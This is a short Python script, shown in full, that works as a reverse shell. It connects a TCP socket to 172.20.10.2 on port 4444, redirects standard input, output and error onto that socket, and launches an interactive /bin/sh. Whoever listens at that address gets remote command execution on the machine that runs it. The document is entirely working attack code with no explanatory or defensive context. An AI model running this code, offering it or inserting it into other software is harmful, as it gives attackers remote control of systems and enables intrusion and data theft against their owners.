import os
import socket,subprocess

def main(ip: str, port: int):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])


if __name__ == "__main__":
    main("172.20.10.2", 4444)
